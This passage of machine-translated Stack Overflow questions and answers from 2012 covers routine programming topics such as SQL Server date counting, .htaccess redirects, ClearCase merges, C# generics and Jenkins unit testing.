我没有查看代码，但这可能是一个很好的起点：[http](http://www.die-schoens.de/prg/) ://www.die-schoens.de/prg/或在[寻找 C++ 中基于磁盘的 B+ 树实现中链接的其他一些代码或 C](https://stackoverflow.com/questions/1720738/looking-for-a-disk-based-b-tree-implementation-in-c-or-c)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-28T14:21:46.173

如果您需要磁盘上的 R-Tree 索引，我建议使用[Spatialite](http://www.gaia-gis.it/gaia-sins/)或[Postgis](http://postgis.refractions.net/)。Spatialite 是轻量级的，易于嵌入到独立的应用程序中。或者，您是否看过[C# Spatial Index 项目？](http://sourceforge.net/projects/cspatialindexrt/?). 几年前我用 Java 编写了一个 R-Tree 实现，如果已经存在，我不建议这样做。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T14:40:10.143

如果您已经有一个主内存实现，您可以重用相同的代码，只需将写入添加到磁盘。您必须考虑页面大小并优化树节点以适应页面（您可以一口气阅读）。

将主内存树的快照存储在磁盘中会更好（在性能方面）（可以在树不处于高压下时拍摄快照）而不是将每个更改都写入磁盘。

在问题中，您指定查询树具有更高的重要性，因此您应该更好地使用 R*-tree，因为它可以最大限度地减少树节点之间的重叠。但是，如果您的要求将集中在更新操作（插入/删除）上，我建议您看一下[Supporting rapid updates in R-trees: a bottom-up approach](http://dl.acm.org/citation.cfm?id=1315504&dl=ACM&coll=DL&CFID=214027280&CFTOKEN=34033267) paper。

# sql - SQL Server 查询日期范围之间一个月的总天数

> ID：13599562
> 
> 赞同：2
> 
> 时间：2012-11-28T07:02:45.143
> 
> 标签：sql, sql-server

我有特定的日期范围，例如

```
From Date        To Date
---------------------------    
2012-11-10       2012-11-15
2012-11-21       2012-11-22
2012-11-30       2012-12-01 
```

我想编写一个 SQL 查询来计算两个日期之间的总天数和特定月份的总天数

我想要的输出是，

```
No of days     month
--------------------
   9            11
   1            12 
```

谁能帮我写这个 SQL 查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:05:56.837

理想情况下，您有一个名为“Dates”的表，其中包含您将使用的所有日期，例如 1950 年到 2100 年。此查询将为您提供所需的结果：

```
 select dateadd(m,datediff(m, 0, d.thedate),0) themonth, count(1)
    from dates d
    join ranges r on d.thedate between r.[from date] and r.[to date]
group by datediff(m, 0, d.thedate)
order by themonth; 
```

结果：

```
|   themonth | COLUMN_1 |
-------------------------
| 2012-11-01 |        9 |
| 2012-12-01 |        1 | 
```

*请注意，不是仅将“11”或“12”显示为月份，如果您的范围超过 12 个月，则效果不佳，或者在跨过新年时无助于排序，此查询显示第一天而是当月的。*

如果没有，您可以根据下面的扩展查询虚拟地创建一个`dates`表：

```
;with dates(thedate) as (
  select dateadd(yy,years.number,0)+days.number
    from master..spt_values years
    join master..spt_values days
      on days.type='p' and days.number < datepart(dy,dateadd(yy,years.number+1,0)-1)
   where years.type='p' and years.number between 100 and 150
      -- note: 100-150 creates dates in the year range 2000-2050
      --       adjust as required
)
  select dateadd(m,datediff(m, 0, d.thedate),0) themonth, count(1)
    from dates d
    join ranges r on d.thedate between r.[from date] and r.[to date]
group by datediff(m, 0, d.thedate)
order by themonth; 
```

此处给出了完整的工作示例：[SQL Fiddle](http://sqlfiddle.com/#!6/d9be5/8/0)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:47:40.763

试试这个

```
select ((day(date_to)) - (day(date_from))) as no_of_days,month(date_from)as month from tablename 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:59:18.777

请原谅我写得不好的 SQL。
假设是月份差异。fromdate 和 todate 之间为 1。

架构

```
CREATE TABLE dateData
    (fromdate datetime, todate datetime)
;

INSERT INTO dateData
    (fromdate, todate)
VALUES
    ('2012-11-10', '2012-11-15'),
    ('2012-11-21', '2012-11-22'),
    ('2012-11-30', '2012-12-01')
; 
```

SQL

```
select mth, sum(days) as daysInMth
from
(
select month(fromdate) as mth,
sum(case 
when month(fromdate) = month(todate) then datediff(dd, fromdate, todate)+1
else datediff(dd, fromdate, dateadd(mm, 1, fromdate) - day(fromdate)) + 1 end)
as days 
from dateData
group by month(fromdate)
union
select month(todate) as mth,
sum(case when month(todate) <> month(fromdate) then
datediff(dd, fromdate, dateadd(mm, 1, fromdate) - day(fromdate)) + 1
else 
case when month(todate) = month(fromdate) then 0 else
datediff(dd, convert(datetime, year(todate) + '-' + month(todate) + '-1'), todate) 
end
end) as days
from dateData
group by month(todate)
) aggregated
group by mth 
```

查看 SQLFiddle：[http ://www.sqlfiddle.com/#!3/9f7da/56](http://www.sqlfiddle.com/#!3/9f7da/56)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T08:00:51.393

我将其分解为几个步骤（每个步骤都有一个单独的 CTE）：

```
declare @Ranges table (FromDate date not null,ToDate date not null)
insert into @Ranges (FromDate,ToDate) values
('20121110','20121115'),
('20121121','20121122'),
('20121130','20121201')

;with Months as (
    select
        DATEADD(month,DATEDIFF(month,'20010101',FromDate),'20010101') as MonthStart,
        DATEADD(month,DATEDIFF(month,'20010101',FromDate),'20010131') as MonthEnd
    from @Ranges
    union /* not all */
    select
        DATEADD(month,DATEDIFF(month,'20010101',ToDate),'20010101') as MonthStart,
        DATEADD(month,DATEDIFF(month,'20010101',ToDate),'20010131') as MonthEnd
    from @Ranges
), MonthRanges as (
    select
        CASE WHEN r.FromDate > m.MonthStart then r.FromDate ELSE m.MonthStart END as StartRange,
        CASE WHEN r.ToDate < m.MonthEnd then r.ToDate ELSE m.MonthEnd END as EndRange
    from
        @Ranges r
            inner join
        Months m
            on
                r.ToDate >= m.MonthStart and
                r.FromDate <= m.MonthEnd
)
select
    DATEPART(month,StartRange),
    SUM(DATEDIFF(day,StartRange,EndRange)+1) /* Inclusive */
from
    MonthRanges
group by
    DATEPART(month,StartRange) 
```

首先，`Months`CTE 找到我们可能感兴趣的每个月的第一天和最后几天（*）。然后，`MonthRanges`将此数据与原始范围重新组合并根据需要对其进行拆分，以便我们处理的每个时间段仅代表一个月中的几天。然后我们可以只使用`DATEDIFF`来计算每个范围跨越的天数（并添加 1，因为我们正在处理日期并想要包含值）

(*) `Months`CTE 将起作用，前提是我们不处理跨越多个月的任何范围，并且在中间几个月内没有其他范围开始或结束。如果你需要应对这种情况，我需要修改`Months`CTE。例如，如果我们`('20120115','20120315')`在上面的样本中添加（并且没有其他范围），我们将不会使用上面的方法得到二月份的结果。我们需要应对这种情况吗？

* * *

为了应对 (*) 中指出的情况，我们可以将`Months`上述查询中的 CTE 替换为：

```
;With LastMonth as (
    select MAX(ToDate) as Mx from @Ranges
), MultiMonths as (
    select
        DATEADD(month,DATEDIFF(month,'20010101',FromDate),'20010101') as MonthStart,
        DATEADD(month,DATEDIFF(month,'20010101',FromDate),'20010131') as MonthEnd
    from @Ranges
    union all
    select
        DATEADD(month,1,MonthStart),
        DATEADD(month,1,MonthEnd)
    from MultiMonths
    where MonthStart <= (select Mx from LastMonth)
), Months as (
    select distinct MonthStart,MonthEnd from MultiMonths 
) 
```

# php - 如何对子页面执行 301 重定向？

> ID：13599569
> 
> 赞同：0
> 
> 时间：2012-11-28T07:03:13.480
> 
> 标签：php

我想为我网站中的每个页面执行 301 重定向。主页我做了重定向，但是对于子页面我无法执行我试过的同样的事情

我有这些网址

```
liyyas.com/newcollections/tops
liyyas.com/newcollections/shorts
liyyas.com/newcollections/pants

   if($_SERVER['HTTP_HOST'] == 'liyyas.com/newcollections')
        {
          Header( "HTTP/1.1 301 Moved Permanently" );
          Header( "Location: http://www.liyyas.com/newcollections" );   
        } 
```

为了执行 301 重定向，我只想检查 liyyas.com/ 到此，但 $_SERVER['HTTP_HOST'] 将采用完整的 URL 所以我可以传递任何其他变量而不是使用 $_SERVER['HTTP_HOST']

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:08:52.393

.htaccess

```
RewriteEngine On
RewriteRule ^(.*)$ http://www.liyyas.com/newcollections/ [R=301] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:29:51.043

如果您想要纯 PHP，请尝试将其添加到每个子页面

```
if($_SERVER['HTTP_HOST'] == 'liyyas.com')
{
  Header( "HTTP/1.1 301 Moved Permanently" );
  Header( "Location: http://www.".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] );   
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:07:59.793

你使用 APACHE 吗？我知道如果您使用 Apache，您可以使用 .htaccess 来完成。只需添加以下行，所有 301 错误都会重定向到您的主页

```
ErrorDocument 301 'mysamplepage.php' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:08:20.830

.htaccess

```
RewriteEngine on
RewriteCond %{HTTP_HOST} ^domain\.com
RewriteRule ^(.*)$ http://www.domain.com/$1 [R=permanent,L] 
```

# ruby-on-rails - Rails time_select 中的有效范围

> ID：13599570
> 
> 赞同：3
> 
> 时间：2012-11-28T07:03:21.530
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2

有没有办法将范围应用于 time_select 助手？

我正在尝试将其设置为有效的工作时间，例如：

```
time_select('object_name', 'method', { :start_hour => 09, :end_hour => 17, :minute_step => 05 }) 
```

我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:11:44.657

你不能那样做。您必须更改 DateTimeSelector 上的 select_hour 方法，如下所示：

```
module ActionView
  module Helpers
    class DateTimeSelector
      def select_hour
        if @options[:use_hidden] || @options[:discard_hour]
          build_hidden(:hour, hour)
        else
          build_options_and_select(:hour, hour, :start => @options[:start_hour], :end => @options[:end_hour], :ampm => @options[:ampm])
        end
      end
    end
  end
end 
```

（未测试）

# ios - 禁用 UIView 与其父视图的混合

> ID：13599573
> 
> 赞同：0
> 
> 时间：2012-11-28T07:03:34.793
> 
> 标签：ios, cocoa-touch, uikit, core-graphics, blending

我在 coregraphics 中创建一个矩形 - 在**UIView**`- (void)drawRect:(CGRect)rect`的方法中使用 CGContext 函数并将其添加到**superview**。当我更改**superview的背景时，** **UIView**的颜色与之混合。我想禁用这种混合。

 ******* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T06:42:53.383

通过一些探索（Apple 的 QuartzDemo 代码），我终于找到了问题的答案。UIView 的颜色是使用 [UIcolor color with R:G:B:Alpha] 填充的，并且 alpha 不是 1.0。

我也用过`CGContextSetBlendMode(context, kCGBlendModeNormal);`******

# c++ - TreeView 捕获展开（或折叠）消息？

> ID：13599574
> 
> 赞同：1
> 
> 时间：2012-11-28T07:03:35.620
> 
> 标签：c++, winapi, treeview, controls

我正在尝试在我的树视图上实现状态图像；我想在按钮上有自己的图像，而不是默认的 + 和 -。

我有一个图像显示，但是当我展开节点时它不会改变 - 显然我需要在树视图的状态改变时显式更新状态图像。

我要捕获哪条消息（在主窗口过程中）来实现这一点？ `TVM_EXPAND`似乎不起作用，网上的各种讨论都推荐了一些奇怪的东西，比如点击测试鼠标点击或类似的奇怪东西。

或者，如果有关于此的 whizbang 教程或其他内容，请发布 - 我正在使用纯 MSDN（呃），而[这](http://www.roguewave.com/portals/0/products/stingray/docs/11/html/otug/14-8.html#1487)大部分是......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T08:24:36.170

通过`WM_NOTIFY`消息，您将`TVN_ITEMEXPANDING`在单击展开按钮以及`TVN_ITEMEXPANDED`项目实际展开/折叠时得到消息。

# c# - 如何从文字控制中获得实际控制？

> ID：13599576
> 
> 赞同：0
> 
> 时间：2012-11-28T07:03:44.830
> 
> 标签：c#, javascript, asp.net

我有一个用户控件，其中添加了一个 GridView 控件。在那我已经动态地添加了一些控件。当我试图从用户控件的 GridView 中获取特定控件时，我得到的是 Literal 控件而不是实际控件。

```
foreach (Control ctrl in this.Controls){
  if (ctrl.GetType() == typeof(LookupControl))  {
    //do action
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:16:48.610

只需将其转换为所需的类型：

```
LookUpControl myCtrl = (LookUpControl)ctrl; 
```

# merge - cleartool - 合并单个过程

> ID：13599578
> 
> 赞同：1
> 
> 时间：2012-11-28T07:03:50.173
> 
> 标签：merge, clearcase, cleartool

我正在尝试将单个 proc 从分支合并`Nov12`到`main`. 在此参考资料中搜索后，我发现以下内容应将分支中的副本合并到主目录中

```
Merge version 1 on the branch into the "latest" version in the "main" branch:
ct merge -to new_update.sql -insert -version /main/Nov12/1 
```

运行此之后，我得到的输出为

```
Trivial merge: "new_update.sql" is same as base "/home/mtk/ct/new_update.sql@@/main/Nov12/0".
Copying "/home/mtk/ct/new_update.sql @@/main/Nov12/1" to output file.
Output of merge is in "new_update.sql.merge". 
```

包含本地磁盘上的`new_update.sql.merge`完整过程，它不在 clearcase 版本控制中。我做了一个`ct lsh`来验证这一点。

我希望它应该在 main 上创建一个新版本并将更新的副本放入其中，即 /main/9 尚不存在。最新`/main`版本是 8。

那么，如何合并单个 proc。我们是否需要从主目录签出副本，然后运行上述命令。请让我知道，我不清楚这一点。我需要一个命令行解决方案，因为图形替代方案不可用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:28:00.470

您需要在视图集中创建版本`/main`。
相反，您的合并想要创建一个版本`Nov12`

“[从子分支合并选择性版本](http://publib.boulder.ibm.com/infocenter/cchelp/v7r0m0/topic/com.ibm.rational.clearcase.hlp.doc/cc_main/to_merge_select_branch.htm)”页面详细说明了您正在使用的合并：

```
cleartool merge [ -graphical ] -to target-path -insert contributor-version-selector  [contributor-version-selector] 
```

但它也需要先**检查****目标*版本***。
这意味着，即使在合并之前，您也应该在版本树中看到在您的版本之后创建的版本`/main/8`。

因此，在正确的目标视图中再次尝试合并，这是为了在`/main`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T07:28:41.753

我认为问题在于你没有指定输出的去向，所以它被放在了文件`new_update.sql.merge`中，假设当前视图有一个 cspec 设置为你的目标分支，`/main`. （如果您的视图没有引用`/main`分支，则您合并到了错误的视图中。）您现在可以执行以下操作：

```
mv new_update.sql.merge new_update.sql 
```

然后进行签入，假设您或 ClearCase 进行了必要的签出。

* * *

这不是我通常做合并的方式——但这并不是说它是无效的。我使用的机制是`ct findmerge`然后从日志文件中运行命令。我有两个视图，一个带有用于 Nov12 分支的 cspec（视图标记可能是`nov12`），另一个（当前视图）带有用于主分支的 cspec。

```
ct findmerge -ftag nov12 new_update.sql 
```

输出可能包括如下行：

```
Needs Merge "./samizdat.c" [(automatic) to /main/XYZ.1.70/0 from /main/XYZ.1.70
    /TEMP.bug233636.jleffler/1 (base also /main/XYZ.1.70/0)] 
```

这将生成一个日志文件，其名称如下：

```
findmerge.log.2012-11-27T23:12:43-08:00 
```

该文件的内容是如下命令：

```
cleartool findmerge ./samizdat.c -fver /main/XYZ.1.70/TEMP.bug233636.jleffler/1 -log /dev/null -merge -cqe 
```

表示“`-merge`非图形合并”（`-gmerge`用于图形）；意思是`-cqe`“查询每次结帐的评论”（我总是用 代替`-c "Bug 233636: Brief title for bug"`）。

我怀疑这是否是最快的经商方式，但它确实对我有用。我伪装了文件和分支名称，但假设我的审查获得批准，那（或多或少）我将如何合并和签入大约 20 个文件以实现迷你（微型？）功能。我有封面脚本来驱动很多这样的东西，所以我的命令序列实际上是：

```
fmp -l log 233636 /vobs/project/ /vobs/auxilliary
fmm log
ct ci -c 'Bug 233636: Brief title for bug' $(ct lsco -avo -cvi -s) 
```

( `fmp`find merge and print) 脚本首先运行`findmerge`，输出到文件`log`。( `fmm`find merge and merge) 脚本执行实际的合并，并自动为要合并的文件提供最后签入消息。最后一行使用我选择的评论（`ct`是 的别名`cleartool`）进行签入，覆盖由 提供的评论`fmm`。

# c# - 泛型 C# 上的类型约束 - 多个约束

> ID：13599584
> 
> 赞同：1
> 
> 时间：2012-11-28T07:04:17.613
> 
> 标签：c#, generics, type-constraints

我有一个包含两组数据的类。

1.  X 的值列表。
2.  Y 的值列表。

现在，X 和 Y 可以以任何可能的组合保存字符串/双精度/整数/日期时间。唯一的规则是在任何给定时间点，两个列表必须包含相同数量的值。

我可以通过仅通过 AddXY 方法和 RemoveAt 方法提供访问来解决始终保持相同数据的问题（确保在任何给定时间点，我可以保证 X 列表和 Y 列表的大小相同）。

此外，我希望此类的最终用户能够通过索引器访问 X 和 Y 值，如下所示。

someClassInstance.X[i] 和 someClassInstance.Y[i]

由于在 C# 中没有此选项，因此我选择将 X 和 Y 公开为 IList (AsReadOnly) 方法。

现在，我考虑了使用泛型来约束类型的想法。但我无法为这种特殊情况找到合适的例子。

我怎么说

```
public class MyClass<P, Q> 
     where P : Double, String, Integer, DateTime 
     and Q : Double, String, Integer, DateTime 
```

我应该完全放弃这个想法并查看某种元组或某种这样的数据结构吗？

编辑：我也知道约束不能是值类型，那么这是如何工作的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:06:48.613

你所问的在 C# 中是不可能的。没有统一这些类型的通用类型约束。

您可以做的最好的事情是在运行时检查，例如在静态构造函数中。像这样的东西：

```
public class MyClass<P, Q>
{
    static MyClass() 
    {
       if (IsValidType(typeof(P) 
           && IsValidType(typeof(Q))
       throw new NotSupportedException("invalid type for MyDataStructure");
    }
    static bool IsValidType(Type type)
    {
       // logic to check whether type is acceptable
       return true;
    }
} 
```

但是，我建议不要这样做，因为它似乎有些人为。

# applescript - AppleScript：连接到现有字符串

> ID：13599592
> 
> 赞同：3
> 
> 时间：2012-11-28T07:04:35.837
> 
> 标签：applescript

```
set message to "Hello world "
set message to message & message 
```

这会产生错误。连接字符串的正确方法是什么？我需要使用相同的变量名，因为我将在循环中使用它。

或者简而言之 PHP 风格

```
$message = 'Hello world ';
$message .= $message 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T11:40:58.223

对于某些应用程序和/或 OSAX，*消息*一词是命令、类或属性。为了使这项工作无论在哪个上下文中执行，您都应该在变量名周围包裹管道。因此，要在告诉邮件块中使用您的代码，代码应如下所示：

```
tell application "Mail"
    set |message| to "Hello world "
    set |message| to |message| & |message|
end tell 
```

我知道它看起来很难看，但这是强制 AppleScript 将单词解释为变量的唯一方法。

编辑：FWIW，我使用变量名驼峰式大小写，单个单词总是以“the”开头。所以我会使用 theMessage 而不是只使用与应用程序关键字不冲突的消息。'the' 就像 PHP 中的美元符号。

编辑2：语法

# jquery - JQuery .get 数据计数

> ID：13599598
> 
> 赞同：1
> 
> 时间：2012-11-28T07:05:09.783
> 
> 标签：jquery

我有一个文件（aa.html）包含以下内容：

```
 <p> Item1 </p>
 <p> Item2 </p>
 <p> Item3 </p> 
```

我可以用这个来阅读它：

```
$.get('aa.html', function(data) {
alert(data);
}); 
```

我怎么知道里面的项目数（或计数`<p>`）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:10:02.177

```
$.get('aa.html', function(data) {
  var dom = $('<div/>').append(data);
  alert("# of <p> elements: " + dom.find('p').length);
}); 
```

# c# - 不使用 savedialogfile 将 png 文件保存在应用程序图像文件夹中

> ID：13599599
> 
> 赞同：1
> 
> 时间：2012-11-28T07:05:10.677
> 
> 标签：c#, asp.net, silverlight-4.0

我使用 savedialogfile 保存一个 png 文件。但我想将它保存在应用程序 IMG 文件夹中。我的代码如下：

```
if (lastSnapshot != null)//writableBitmap object lastSnapshot
        {
            var dlg = new SaveFileDialog();
            dlg.DefaultExt = ".png";
            dlg.Filter = "PNG File|*.png";
            if (dlg.ShowDialog() == true)
            {
                using (var pngStream = GetPngStream(lastSnapshot))//return Stream type 
                using (var file = dlg.OpenFile())
                {
                    byte[] binaryData = new Byte[pngStream.Length];
                    long bytesRead = pngStream.Read(binaryData, 0, (int)pngStream.Length);
                    file.Write(binaryData, 0, (int)pngStream.Length);
                    file.Flush();
                    file.Close();
                }
            }
        } 
```

怎么做？我会感谢任何会帮助我的人。提前致谢。

[我的相邻问题](https://stackoverflow.com/questions/13603030/save-png-file-in-application-image-folder-in-silverlight)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:10:49.430

```
if (lastSnapshot != null)//writableBitmap object lastSnapshot
{
     using (var pngStream = GetPngStream(lastSnapshot))//return Stream type 
     using (var file = File.Create(Path.Combine("ImageFolder", "ImageName.png")))
     {
         byte[] binaryData = new Byte[pngStream.Length];
         long bytesRead = pngStream.Read(binaryData, 0, (int)pngStream.Length);
         file.Write(binaryData, 0, (int)pngStream.Length);
     }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:17:46.703

假设 ASP.net...

您需要使用[HttpServerUtility.MapPath](http://msdn.microsoft.com/en-us/library/system.web.httpserverutility.mappath.aspx)来计算服务器上路径的位置，并可能调整该文件夹的权限以允许 IIS 在那里写入。

```
var filePath = Server.MapPath("images\\myFile.png");
using (var file = File.Create(filePath))
{
  pngStream.Copy(file);
} 
```

# android - 设备上的Android项目部署：应用配置错误

> ID：13599601
> 
> 赞同：0
> 
> 时间：2012-11-28T07:05:16.773
> 
> 标签：android

我创建了一个包含许多活动（地图和列表视图以及 Facebook 登录）的 Android 项目。它在模拟器上完美运行，但是当我将它部署到设备上时，它在连接到 Facebook 应用程序时出现错误。

错误是：

> （应用程序被错误配置为 Facebook 登录，还显示了哈希键值）

提示的哈希值和我在 Facebook 哈希键中输入的不一样。最后只是一个“=”符号的区别。

我发现了很多与这个问题相关的问题，但没有一个能解决我的问题。

感谢您的回复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-15T13:00:53.187

有两种可能

您的哈希键值是否错误或图形资源管理器 facebook 中的沙盒值是否已关闭（禁用）。使用正确的应用程序哈希键将其打开。

# opengl - 投影纹理映射

> ID：13599602
> 
> 赞同：1
> 
> 时间：2012-11-28T07:05:24.637
> 
> 标签：opengl, glsl

我正在尝试将图像投射为光源的聚光灯。

到目前为止，我的片段着色器看起来像

```
uniform sampler2D image;
varying vec4 projCoord;

void main() {

gl_FragColor = texture2DProj(image, gl_TexCoord[0].xyzw);

} 
```

我的顶点着色器看起来像

```
varying vec4 projCoord;
void main() {
    gl_Position = gl_ModelViewMatrix * gl_Vertex;
    vec4 pos = gl_ModelViewMatrix * gl_Vertex;
    projCoord = gl_TextureMatrix[4] * pos;
} 
```

我只想从我的光源投射图像。我知道我需要添加我的光矢量并以这种方式对其进行操作，但我无法正确投影我的图像。Atm，我的图像被投影到所有四个侧面的加载对象（立方体）上。

# php - 使用 Jenkins CI 进行单元测试

> ID：13599604
> 
> 赞同：0
> 
> 时间：2012-11-28T07:05:33.590
> 
> 标签：php, android, ios, jenkins, continuous-integration

我正在为我的开发团队研究 Jenkins，并开始意识到我最终想要的是更多的单元测试和更少的集成。

在这一点上，我对与 Jenkins 的集成或部署不太感兴趣。我现在最想要的是在提交代码时自动化测试，并在出现问题时向开发人员报告。

詹金斯仍然是我想要完成的一个很好的解决方案吗？

如果是，我是否需要先编写所有单元测试，然后将它们添加到 Jenkins？每个单元测试都需要一个 Jenkins 作业，还是可以将多个单元测试合并到一个 Jenkins 作业中？

最终，我想自动化测试 PHP、Java（适用于 Android）和 Objective-C（iOS）。

谢谢！

D b

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:10:25.113

是的，Jenkins 绝对是一个有效的解决方案，它将允许您为 Android 和 iOS 运行测试。对于 PHP，我不能说，但我想是的。

Jenkins 基本上是一个脚本运行器，可以插入 scm 并运行由 scm 更改触发的脚本。所以编写你的测试，在你的机器上运行它们，然后找到一种方法让它们在每次提交时通过 Jenkins 自动运行：这就是 CI 的精髓。

对于 Android 和 iOS，运行构建作业和执行测试有点棘手，因为您需要构建运行模拟器（尽管如果您足够有钱，您仍然可以将设备连接到服务器）。还有一些插件，比如 Jenkins Android 模拟器插件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:16:01.820

是的，Jenkins（以及几乎任何其他名副其实的 CI 工具）绝对能够运行单元测试。

关于术语的旁白：“集成”是“持续集成”并不*意味着*“集成测试”（尽管您当然也可以运行它们）。它指的是“集成更改”，即签入。现在（谢天谢地！）早就过去了，这不是给定的：开发人员可以连续数周不签入，或者只签入个人分支。将代码集成到主线可能需要数周时间。解决这个问题的（当时革命性的）想法是：每晚构建，因此称为“夜间构建”。自然的扩展是持续构建，这需要服务器轮询 CM 系统以进行更改。

*从这个角度来看，没有*集成就无法运行单元测试，因为通常必须先构建，然后进行单元测试。如上所述：Jenkins[对单元测试有很强的支持](https://wiki.jenkins-ci.org/display/JENKINS/Unit+Test)：它将很容易地建模为顶层的单一工作。

另请参阅该家族中更强大（且更昂贵）的动物，例如[Electric Commander](http://www.electric-cloud.com/products/electriccommander.php)。

# .htaccess - 仅重定向子文件夹内的特定子目录

> ID：13599605
> 
> 赞同：1
> 
> 时间：2012-11-28T07:05:36.383
> 
> 标签：.htaccess, redirect

使用`.htaccess`我成功地将一组特定的子文件夹（*blog*、*dev*、*media*等）重定向到子域。

像这样：

> `www.website.com/_subs/dev/foo`被定向到`dev.website.com/foo`

这是通过以下代码片段实现的：

> ```
> RewriteEngine on
> RewriteBase /
> 
> RewriteCond %{HTTP_HOST} ^website.com$
> RewriteRule ^(.*)$ http://www.website.com/$1 [R=301,L]
> 
> RewriteCond %{HTTP_HOST} website.com
> RewriteCond %{REQUEST_URI} ^/_subs/blog/(.*)$
> RewriteRule .* http://blog.website.com/%1 [R=301,L]
> 
> RewriteCond %{HTTP_HOST} website.com
> RewriteCond %{REQUEST_URI} ^/_subs/dev/(.*)$
> RewriteRule .* http://dev.website.com/%1 [R=301,L]
> 
> RewriteCond %{HTTP_HOST} website.com
> RewriteCond %{REQUEST_URI} ^/_subs/media/(.*)$
> RewriteRule .* http://media.website.com/%1 [R=301,L] 
> ```

问题是：

> **如果没有对我的特定子文件夹之一提出请求，我如何防止访问该`/_subs`文件夹？**

我希望任何请求都被`www.website.com/_subs/foo`简单地重定向到`www.website.com`

我尝试使用 301 重定向以及其他各种尝试均无济于事:(

任何帮助将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T08:30:31.467

你的规则比他们需要的复杂得多，我认为这使得解决方案更难看到。

这是我想出的：

```
RewriteEngine on
RewriteBase /

RewriteCond %{HTTP_HOST} ^(www.)?website.com$
RewriteRule ^_sub/(blog|dev|media)/?(.*)$ http://$1.website.com/$2 [R=301,L]

RewriteCond %{HTTP_HOST} ^(www.)?website.com$
RewriteRule ^_sub(/.*)$ - [F]

RewriteCond %{HTTP_HOST} ^website.com$
RewriteRule ^(.*)$ http://www.website.com/$1 [R=301] 
```

s 限制前两条规则，`RewriteCond`使它们只在`website.com`和上运行`www.website.com`。大概您`http://blog.website.com/_sub/this-rocks`将来可能有一个不想重定向的网址。

在第一次重写中包含这两个域意味着您将减少一个 301 重定向，这应该会更快地向[http://website.com/_sub/blog](http://website.com/_sub/blog)直接重定向到[http://blog.website.com的请求。](http://blog.website.com)L 确保符合此规则的任何内容都不会被标记为禁止。

`/_sub`对于以第一个规则不匹配的任何开头的任何内容，第二次重写返回 403 。位于`/`组内，因此它将匹配`/_sub`,`/_sub/`和`/_sub/.*`。如果在外面，如果没有单独的规则`/`，您将无法进行 403 。`/_sub`

最后一次重写与您的第一条规则相同 - 但是，无需放置 L，因为它已经是要处理的最后一条规则。

# google-apps-script - 超过电子表格服务使用量

> ID：13599616
> 
> 赞同：2
> 
> 时间：2012-11-28T07:06:32.917
> 
> 标签：google-apps-script

我突然开始在我的电子表格中收到此错误：

> 服务在短时间内调用太多次：电子表格。

当我手动运行脚本函数时，或者有时在自定义函数输出中（导致单元格的值为#ERROR！）时，这会弹出。

我的工作表可能有 100 个（可能更少）条目，使用像 =bug(1050505) 这样的自定义函数。这个自定义函数从我的电子表格中的一张表中读取值，并从具有相应错误编号的行中复制某些值。我承认这不是非常有效，我很想找到一种更好的方法来做到这一点。但它确实总是用来工作的。电子表格服务的限制是否已显着降低？我能做些什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T22:58:35.247

请注意，可能不仅仅是函数调用导致您达到配额限制。如果您前往[Google Apps 脚本仪表板](https://docs.google.com/macros/dashboard)并单击`Quota Limits`，您将看到以下限制：

*   电子邮件收件人：**500 个/天**
*   SOAP 调用：**500 个/天**
*   每个用户每个脚本的触发器：**20 个/天**
*   UrlFetch 标头：**100**

一种可能的解决方案是让您的函数以交互方式调用，而不是自动运行。

# azure - Elastica 搜索结果未得到处理

> ID：13599625
> 
> 赞同：0
> 
> 时间：2012-11-28T07:07:12.843
> 
> 标签：azure, elasticsearch, elastica

我正在使用 elastica 在 windows azure linux 虚拟机上搜索 elasticsearch 索引。我使用弹性搜索的 JAVA API 创建了索引：-

```
IndexResponse response = client.prepareIndex("nod", "rel").setSource(met.xb).execute().actionGet(); 
```

这就是我尝试连接和搜索的方式：-

```
$elasticaClient = new Elastica_Client(array(
                    'host' => 'localhost',
                    'port' => '9200'
                ));
$result= $elasticaClient->request("nod/rel/_search", "GET",$dt) 
```

它只是在输出 php 页面上打印单词“Array”。

`var_dump($elasticaClient)`打印这个： -

```
object(Elastica_Client)#2 (1) { ["_config":protected]=> array(13) { ["host"]=> string(9) "localhost" ["port"]=> string(4) "9200" ["path"]=> string(0) "" ["url"]=> NULL ["transport"]=> string(4) "Http" ["persistent"]=> bool(true) ["timeout"]=> int(300) ["headers"]=> array(0) { } ["servers"]=> array(0) { } ["curl"]=> array(0) { } ["roundRobin"]=> bool(false) ["log"]=> bool(false) ["retryOnConflict"]=> int(0) } } 
```

var_dump($result) 什么也不打印。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T21:58:40.373

